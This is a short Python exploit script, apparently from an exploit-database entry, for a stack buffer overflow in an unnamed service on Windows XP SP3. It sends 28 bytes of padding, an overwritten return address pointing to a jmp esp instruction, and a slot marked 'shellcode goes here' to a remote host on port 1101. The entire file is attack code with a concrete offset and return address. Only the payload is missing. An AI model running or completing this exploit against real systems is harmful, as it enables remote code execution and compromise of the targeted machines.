"""
Full title:	Buffer Overflow
Exploit Author:	Paolo Stagno - voidsec@voidsec.com - https://voidsec.com
Tested on:	Windows XP SP3
Category:	local exploits
Platform:	windows
"""
#!/usr/bin/python

import sys, socket

if len(sys.argv) < 2:
    	print "\nUsage: " + sys.argv[0] + " <HOST>\n"
    	sys.exit()

junk ="A"*28
eip="\x78\x6a\x83\x7c"#xp sp3 (en) jmp/call esp 7C836A78
nop="\x90"
buf =  "shellcode goes here"

payload = junk+eip+nop+buf

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 1101))
s.send(payload)
s.recv(1024)
s.close()

